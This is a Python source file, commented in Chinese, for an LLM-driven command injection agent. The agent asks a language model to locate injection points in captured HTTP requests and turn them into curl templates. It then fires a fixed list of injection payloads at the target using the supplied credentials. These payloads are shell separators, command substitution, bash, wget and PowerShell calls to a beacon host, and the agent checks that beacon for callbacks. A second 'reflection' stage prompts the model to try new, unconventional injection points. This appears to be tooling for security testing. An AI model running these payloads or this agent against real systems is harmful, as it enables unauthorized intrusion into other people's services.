"""
Command Injection Agent - 完整版（使用LLM生成注入点）
"""

from typing import Dict, Any, List
from pathlib import Path
import subprocess
import random
import string
import json
import re
from urllib.parse import quote
from attack_agent.request_utils import append_credentials_to_curl
from config.llm_config import get_model_name, get_temperature
from attack_agent.request_utils import extract_useful_response

class CommandInjectionAgent:
    """
    命令注入测试Agent（完整实现）

    工作流程：
    1. 调用LLM分析请求，识别命令注入点
    2. LLM生成带{PAYLOAD}占位符的curl命令模板
    3. 生成统一的token（用于beacon检测）
    4. 生成命令注入payload列表（包含beacon URL + token）
    5. 用实际payload替换{PAYLOAD}占位符
    6. 执行测试并记录token
    7. 用户需要检查beacon服务器是否收到请求
    """

    def __init__(self, client,
                 prompt_path: str = "prompt/command_injection_attack.txt",
                 beacon_base: str = "http://172.17.0.1:9091/",
                 log_dir: str = "output/attack_logs/cmdi",
                 reflection_enabled: bool = True):  # ✅ 新增：反思功能开关
        self.client = client
        self.prompt_path = Path(prompt_path)
        self.beacon_base = beacon_base.rstrip("/") + "/"
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self._log_path = self.log_dir / "cmdi_agent.log"
        self.reflection_enabled = reflection_enabled  # ✅ 保存配置

        # ✅ 新增：记录所有执行的测试（用于延迟检测）
        self.execution_records: Dict[str, Dict[str, Any]] = {}  # {token: {url, payloads, ...}}

    def _log(self, *args):
        msg = " ".join(str(a) for a in args)
        try:
            with open(self._log_path, "a", encoding="utf-8") as f:
                f.write(msg + "\n")
        except Exception:
            pass

    def _load_prompt_template(self) -> str:
        """加载CMDI prompt模板"""
        return self.prompt_path.read_text(encoding="utf-8")

    def _generate_token(self, length: int = 16) -> str:
        """生成随机token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        测试单个请求的命令注入（两阶段版本）

        两阶段测试流程：
        - Stage 1: 初始攻击（使用原始prompt）
        - Stage 2: 反思攻击（如果Stage 1失败，基于失败分析生成新策略）

        Args:
            request: 完整请求数据（包含response）
            credentials: 账户凭证

        Returns:
            {
                "vulnerable": True/False/None,
                "stage": 1 or 2,
                "token": str,
                "payloads_tested": int,
                "beacon_url": str,
                "curl_templates": List[str]
            }
        """
        # ========== Stage 1: 初始攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 1: Initial Attack]")
        self._log(f"{'='*70}\n")

        result_stage1 = self._execute_stage1(request, credentials)

        # 如果检测到漏洞，直接返回
        if result_stage1.get("vulnerable") is True:
            self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
            return result_stage1

        # 如果未启用反思，直接返回Stage 1结果
        if not self.reflection_enabled:
            self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
            return result_stage1

        # ========== Stage 2: 反思攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 2: Reflective Attack]")
        self._log(f"{'='*70}")
        self._log(f"[Reflection] Stage 1 did not detect vulnerability, starting reflection analysis...")
        self._log(f"")

        result_stage2 = self._execute_stage2(
            request=request,
            credentials=credentials,
            stage1_context=result_stage1
        )

        return result_stage2

    def _execute_stage1(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 1初始攻击

        Returns:
            Stage 1结果字典（包含test_results和llm_analysis用于反思）
        """
        method = request.get("method", "GET")
        url = request.get("url", "")

        self._log(f"\n{'='*70}")
        self._log(f"[CMDI] New Test Started")
        self._log(f"{'='*70}")
        self._log(f"[CMDI] Testing: {method} {url}")
        self._log(f"\n[Received from Planning Agent]:")
        self._log(f"  Target Request:")
        self._log(f"    Method: {method}")
        self._log(f"    URL: {url}")
        self._log(f"    Headers: {json.dumps(request.get('headers', {}), indent=6)}")
        self._log(f"    Body: {request.get('body', 'None')}")
        self._log(f"    Response Status: {request.get('response_status', 'N/A')}")
        original_response = str(request.get('response_body', ''))
        extracted_response = extract_useful_response(original_response, max_length=2000)
        self._log(f"    Response Body (preview): {extracted_response}")
        self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}")
        self._log(f"")

        # ========== 第一步：调用LLM生成curl模板 ==========
        self._log(f"[Step 1: Calling LLM to Identify Injection Points]")
        curl_templates, llm_analysis = self._generate_curl_templates(request)  # ✅ 获取LLM分析输出

        if not curl_templates:
            self._log(f"[CMDI] No injection points identified by LLM")
            return {
                "vulnerable": False,
                "stage": 1,  # ✅ 添加stage标记
                "token": None,
                "payloads_tested": 0,
                "beacon_url": None,
                "curl_templates": [],
                "test_results": [],  # ✅ 添加test_results
                "llm_analysis": llm_analysis,  # ✅ 保存LLM分析
                "note": "No injection points found"
            }

        self._log(f"[LLM Generated {len(curl_templates)} curl template(s)]:")
        for i, tmpl in enumerate(curl_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log(f"")

        # ========== 第二步：生成统一的token ==========
        token = self._generate_token()
        beacon_url = f"{self.beacon_base}?data={token}"
        self._log(f"[Step 2: Generated Unified Token]: {token}")
        self._log(f"[Beacon URL]: {beacon_url}")
        self._log(f"")

        # ========== 第三步：生成命令注入payload列表 ==========
        cmd_payloads = self._get_cmd_payloads(beacon_url)
        self._log(f"[Step 3: Generated {len(cmd_payloads)} Command Injection Payloads]:")
        for i, payload in enumerate(cmd_payloads, 1):
            self._log(f"  {i}. {payload}")
        self._log(f"")

        # ========== 第四步：执行测试 ==========
        self._log(f"[Step 4: Executing Tests]")
        payloads_tested = 0
        test_results: List[Dict[str, Any]] = []  # ✅ 保存测试结果用于反思

        for template in curl_templates:
            self._log(f"\n[Testing Template]: {template}")

            for payload in cmd_payloads:
                # 检查模板是否包含 {PAYLOAD}
                if '{PAYLOAD}' not in template:
                    self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
                    continue

                # ✅ 使用新的安全执行函数
                # - 自动判断 payload 位置并决定是否 URL 编码
                # - 使用 shell=False 避免引号问题
                from attack_agent.request_utils import execute_curl_safe

                # 打印完整payload（不截断）
                self._log(f"  [Payload]: {payload}")

                try:
                    stdout, stderr, returncode, final_cmd = execute_curl_safe(
                        template=template,
                        payload=payload,
                        credentials=credentials,
                        timeout=15
                    )

                    # ✅ 打印真正执行的完整 curl 命令
                    self._log(f"  [Command]: {final_cmd}")

                    # 解析HTTP状态码
                    from attack_agent.request_utils import parse_http_status_from_response
                    http_status, response_body = parse_http_status_from_response(stdout)

                    extracted_response = extract_useful_response(response_body, max_length=2000)
                    self._log(f"  ✓ Executed (curl_exit_code: {returncode})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")
                    self._log(f"  Response length: {len(response_body)} bytes")
                    self._log(f"  Response (extracted):\n{extracted_response}")  # ✅ 打印提取后的
                    if stderr:
                        self._log(f"  Stderr: {stderr}")
                    payloads_tested += 1

                    # ✅ 保存提取后的响应
                    test_results.append({
                        "template": template,
                        "payload": payload,
                        "http_status": http_status,
                        "response": extracted_response,  # ✅ 保存提取后的
                        "stderr": stderr,
                        "returncode": returncode,
                        "final_command": final_cmd
                    })

                except Exception as e:
                    self._log(f"  ✗ Failed: {e}")
                    # ✅ 保存失败结果
                    test_results.append({
                        "template": template,
                        "payload": payload,
                        "error": str(e)
                    })

        self._log(f"\n{'='*70}")
        self._log(f"[CMDI Test Summary]")
        self._log(f"  Total Payloads Tested: {payloads_tested}")
        self._log(f"  Unified Token: {token}")
        self._log(f"  Beacon URL: {beacon_url}")

        # ✅ 检查beacon日志中是否有token
        from attack_agent.request_utils import check_beacon_detection

        vulnerable = check_beacon_detection(token)

        self._log(f"  Beacon Detection: {'✓ TOKEN FOUND' if vulnerable else '✗ Token not found'}")
        self._log(f"  Result: {'VULNERABLE' if vulnerable else 'PENDING (waiting for finalize)'}")
        self._log(f"{'='*70}\n")

        # ✅ 记录执行信息（用于延迟检测）
        self.execution_records[token] = {
            "token": token,
            "beacon_url": beacon_url,
            "url": url,
            "method": method,
            "payloads_tested": payloads_tested
        }

        return {
            "vulnerable": vulnerable if vulnerable else None,  # ✅ None表示pending
            "stage": 1,  # ✅ 标记为Stage 1
            "token": token,
            "payloads_tested": payloads_tested,
            "beacon_url": beacon_url,
            "curl_templates": curl_templates,  # ✅ 保存用于反思
            "test_results": test_results,  # ✅ 保存用于反思
            "llm_analysis": llm_analysis,  # ✅ 保存LLM分析输出
            "note": f"Stage 1 - Beacon detection: {'CMDI confirmed' if vulnerable else 'Pending finalize'}"
        }

    def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
        """
        调用LLM生成带{PAYLOAD}占位符的curl模板

        Returns:
            (curl模板列表, LLM完整输出) 元组
        """
        sys_prompt = self._load_prompt_template()

        # 格式化请求信息
        original_response = str(request.get('response_body', ''))
        extracted_response = extract_useful_response(original_response, max_length=2000)
        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for command injection testing."""

        self._log(f"\n[LLM INPUT - CMDI Analysis Prompt]:")
        self._log(f"{'~'*70}")
        self._log(f"{user_prompt}")
        self._log(f"{'~'*70}\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                temperature=get_temperature("attack_agent")
            )

            llm_output = completion.choices[0].message.content

            self._log(f"[LLM OUTPUT - CMDI Analysis Response]:")
            self._log(f"{'~'*70}")
            self._log(f"{llm_output}")
            self._log(f"{'~'*70}\n")

            # 解析Commands部分
            templates = self._parse_curl_templates(llm_output)

            return templates, llm_output  # ✅ 返回元组

        except Exception as e:
            self._log(f"[CMDI] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""  # ✅ 错误时返回空列表和空字符串

    def _parse_curl_templates(self, llm_output: str) -> List[str]:
        """
        从LLM输出中提取curl模板（改进版，兼容多种LLM输出格式）

        Returns:
            curl模板列表
        """
        templates = []
        lines = llm_output.splitlines()

        # 查找 "Commands" 关键词所在行的索引
        commands_line_idx = -1
        for i, line in enumerate(lines):
            # 简单判断：行中是否包含 "command:" (不区分大小写)
            line_lower = line.lower()
            if 'command:' in line_lower or 'commands:' in line_lower:
                commands_line_idx = i
                break

        if commands_line_idx == -1:
            self._log(f"[Warning] No Commands section found in LLM output")
            return []

        # 从Commands行之后开始解析
        for i in range(commands_line_idx + 1, len(lines)):
            line = lines[i].strip()

            # 跳过空行
            if not line:
                continue

            # 跳过markdown代码块标记
            if line.startswith('```'):
                continue

            # 检查是否包含 curl 关键词和 {PAYLOAD} 占位符
            if 'curl' in line and '{PAYLOAD}' in line:
                # 清理可能的markdown格式
                cleaned = line.lstrip('`').rstrip('`').strip()
                templates.append(cleaned)

        if not templates:
            self._log(f"[Warning] No valid curl commands found after Commands section")

        return templates

    def _get_cmd_payloads(self, beacon_url: str) -> List[str]:
        """
        生成命令注入payload列表

        Args:
            beacon_url: 回调URL（包含token）

        Returns:
            payload列表
        """
        url_encoded = quote(beacon_url, safe=':/?=&')

        return [
            # 直接分隔符
            f";curl {beacon_url}",
            f"&& curl {beacon_url}",
            f"| curl {beacon_url}",
            f"\n curl {beacon_url}",

            # 子进程/命令替换
            f"$(curl {beacon_url})",
            f"`curl {beacon_url}`",

            # 显式shell
            f";bash -c 'curl {beacon_url}'",
            f"&& sh -c \"curl {beacon_url}\"",

            # wget兜底（有的镜像缺curl）
            f";wget -qO- {beacon_url}",
            f"&& wget --quiet --output-document=- {beacon_url}",

            # URL编码变体
            f"%3Bcurl%20{url_encoded}",
            f"%26%26%20curl%20{url_encoded}",

            # Windows命令（如果目标是Windows）
            f"& curl {beacon_url}",
            f"&& powershell -c \"Invoke-WebRequest {beacon_url}\"",
        ]

    # ========== Stage 2: 反思攻击方法 ==========

    def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                       stage1_context: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 2反思攻击（CMDI版，纯OOB检测）

        复用SSRF的反思逻辑
        """
        # 1. 构建反思suffix
        self._log(f"[Reflection] Building reflection analysis...")
        reflection_suffix = self._build_reflection_suffix(stage1_context)

        # 2. 调用LLM生成新模板
        self._log(f"[Step 1: Generating Reflection Templates via LLM]")
        new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
            request=request,
            reflection_suffix=reflection_suffix
        )

        if not new_templates:
            self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
            stage1_context["reflection_attempted"] = True
            stage1_context["reflection_note"] = "No new templates generated"
            return stage1_context

        self._log(f"[LLM Generated {len(new_templates)} new template(s)]:")
        for i, tmpl in enumerate(new_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log(f"")

        # 3. 生成新的token
        token = self._generate_token()
        beacon_url = f"{self.beacon_base}?data={token}"
        self._log(f"[Step 2: Generated New Token]: {token}")
        self._log(f"[Beacon URL]: {beacon_url}")
        self._log(f"")

        # 4. 生成payload列表
        cmd_payloads = self._get_cmd_payloads(beacon_url)
        self._log(f"[Step 3: Generated {len(cmd_payloads)} Command Injection Payloads]:")
        for i, payload in enumerate(cmd_payloads, 1):
            self._log(f"  {i}. {payload}")
        self._log(f"")

        # 5. 执行测试
        self._log(f"[Step 4: Executing Tests]")
        payloads_tested = 0
        test_results: List[Dict[str, Any]] = []

        for template in new_templates:
            self._log(f"\n[Testing Template]: {template}")

            for payload in cmd_payloads:
                if '{PAYLOAD}' not in template:
                    self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
                    continue

                from attack_agent.request_utils import execute_curl_safe

                self._log(f"  [Payload]: {payload}")

                try:
                    stdout, stderr, returncode, final_cmd = execute_curl_safe(
                        template=template,
                        payload=payload,
                        credentials=credentials,
                        timeout=15
                    )

                    # ✅ 打印真正执行的完整 curl 命令
                    self._log(f"  [Command]: {final_cmd}")

                    from attack_agent.request_utils import parse_http_status_from_response
                    http_status, response_body = parse_http_status_from_response(stdout)

                    extracted_response = extract_useful_response(response_body, max_length=2000)
                    self._log(f"  ✓ Executed (curl_exit_code: {returncode})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")
                    self._log(f"  Response length: {len(response_body)} bytes")
                    self._log(f"  Response (extracted):\n{extracted_response}")  # ✅ 打印提取后的
                    if stderr:
                        self._log(f"  Stderr: {stderr}")
                    payloads_tested += 1

                    # ✅ 保存提取后的响应
                    test_results.append({
                        "template": template,
                        "payload": payload,
                        "http_status": http_status,
                        "response": extracted_response,  # ✅ 保存提取后的
                        "stderr": stderr,
                        "returncode": returncode,
                        "final_command": final_cmd
                    })

                except Exception as e:
                    self._log(f"  ✗ Failed: {e}")
                    test_results.append({
                        "template": template,
                        "payload": payload,
                        "error": str(e)
                    })

        # 6. OOB检测
        from attack_agent.request_utils import check_beacon_detection
        vulnerable = check_beacon_detection(token)

        self._log(f"\n{'='*70}")
        self._log(f"[CMDI Test Summary - Stage 2]")
        self._log(f"  Total Payloads Tested: {payloads_tested}")
        self._log(f"  Unified Token: {token}")
        self._log(f"  Beacon URL: {beacon_url}")
        self._log(f"  Beacon Detection: {'✓ TOKEN FOUND' if vulnerable else '✗ Token not found'}")
        self._log(f"  Result: {'VULNERABLE (detected in Stage 2)' if vulnerable else 'PENDING (waiting for finalize)'}")
        self._log(f"{'='*70}\n")

        # 7. 记录执行信息
        method = request.get("method", "GET")
        url = request.get("url", "")
        self.execution_records[token] = {
            "token": token,
            "beacon_url": beacon_url,
            "url": url,
            "method": method,
            "payloads_tested": payloads_tested
        }

        return {
            "vulnerable": vulnerable if vulnerable else None,
            "stage": 2,
            "token": token,
            "payloads_tested": payloads_tested,
            "beacon_url": beacon_url,
            "curl_templates": new_templates,
            "test_results": test_results,  # Stage 2的测试结果
            "llm_reflection_output": llm_reflection_output,
            "reflection_analysis": reflection_suffix,
            # ✅ 新增：保留Stage 1的完整结果
            "stage1_results": {
                "test_results": stage1_context.get("test_results", []),
                "curl_templates": stage1_context.get("curl_templates", []),
                "payloads_tested": stage1_context.get("payloads_tested", 0),
                "llm_analysis": stage1_context.get("llm_analysis", "")
            },
            "note": f"Stage 2 - Reflection attack: ..."
        }

    def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
        """
        构建CMDI反思suffix
        """
        templates = stage1_context.get("curl_templates", [])
        test_results = stage1_context.get("test_results", [])
        vulnerable = stage1_context.get("vulnerable")

        suffix = "\n\n"
        suffix += "="*70 + "\n"
        suffix += "STAGE 1 RESULTS (Failed Detection)\n"
        suffix += "="*70 + "\n\n"

        # 1. 之前生成的模板
        suffix += "Previous Templates Generated:\n"
        for i, tmpl in enumerate(templates, 1):
            suffix += f"{i}. {tmpl}\n"
        suffix += "\n"

        # 2. 执行结果摘要
        suffix += "Execution Results:\n"
        suffix += "-"*70 + "\n"
        suffix += f"Total payloads tested: {len(test_results)}\n"
        suffix += f"OOB beacon detection: FAILED (token not found)\n"
        suffix += "\n"

        # 3. 结果说明
        suffix += f"Result: {'NOT VULNERABLE' if vulnerable is False else 'UNCERTAIN/PENDING'}\n"
        suffix += "\n"

        # 4. 反思任务说明
        suffix += "="*70 + "\n"
        suffix += "YOUR TASK FOR STAGE 2 - REFLECTION\n"
        suffix += "="*70 + "\n\n"

        suffix += """Based on the above failed command injection attempt, please:

1. **Analyze Why Stage 1 Failed**:
   - Was the injection point correct?
   - Did responses show command filtering/escaping?
   - Were there error messages revealing protection mechanisms?
   - Did we test the right parameters/headers?

2. **Design NEW Injection Strategy**:
   - Try DIFFERENT injection points (different parameters, headers, paths, etc.)
   - Adjust request structure based on error patterns
   - Consider alternative approaches (e.g., if URL parameter failed, try POST body or headers)

3. **Generate NEW Curl Command Templates**:
   - Use {PAYLOAD} placeholder (payload content will remain the same - OOB callbacks)
   - Focus on changing WHERE to inject, not WHAT to inject
   - You can modify field names, add/remove parameters, change headers, etc.
   - If previous templates tested URL parameters, try POST body or headers
   - If previous templates used GET, consider POST with different structure

IMPORTANT:
- Keep the {PAYLOAD} placeholder unchanged
- Focus on changing injection points/request structure
- Generate 3-5 NEW templates with DIFFERENT injection points
- Be creative - try unconventional injection points

Output Format (same as Stage 1):

Analysis:
<Your failure analysis and new strategy explanation>

Commands:
<curl command 1 with {PAYLOAD}>
<curl command 2 with {PAYLOAD}>
<curl command 3 with {PAYLOAD}>
...
"""

        return suffix

    def _generate_curl_templates_with_reflection(self, request: Dict[str, Any],
                                                 reflection_suffix: str) -> tuple:
        """
        调用LLM生成反思后的新CMDI模板
        """
        sys_prompt = self._load_prompt_template()

        original_response = str(request.get('response_body', ''))
        extracted_response = extract_useful_response(original_response, max_length=2000)
        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for command injection testing.
"""

        # ✅ Append反思内容
        user_prompt += reflection_suffix

        self._log(f"\n[LLM INPUT - Reflection Prompt]:")
        self._log(f"{'~'*70}")
        self._log(f"{user_prompt}")
        self._log(f"{'~'*70}\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                temperature=get_temperature("attack_agent")
            )

            llm_output = completion.choices[0].message.content

            self._log(f"[LLM OUTPUT - Reflection Response]:")
            self._log(f"{'~'*70}")
            self._log(f"{llm_output}")
            self._log(f"{'~'*70}\n")

            templates = self._parse_curl_templates(llm_output)
            return templates, llm_output

        except Exception as e:
            self._log(f"[Reflection] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""

    def check_final_results(self) -> Dict[str, bool]:
        """检查最终结果（统一延迟检测）"""
        self._log(f"\n{'='*70}")
        self._log(f"[CMDI] Checking Final Results")
        self._log(f"{'='*70}\n")

        updates = {}

        from attack_agent.request_utils import check_beacon_detection

        for token in self.execution_records.keys():
            # 重新检查beacon日志
            is_vulnerable = check_beacon_detection(token)
            updates[token] = is_vulnerable

            if is_vulnerable:
                self._log(f"  ✓ Token {token}: VULNERABLE (detected in beacon log)")
            else:
                self._log(f"  ✗ Token {token}: SAFE (not in beacon log)")

        self._log(f"\n[CMDI] Final Summary:")
        successful = sum(1 for v in updates.values() if v)
        self._log(f"  Total tests: {len(updates)}")
        self._log(f"  Successful CMDI: {successful}")
        self._log(f"{'='*70}\n")

        return updates
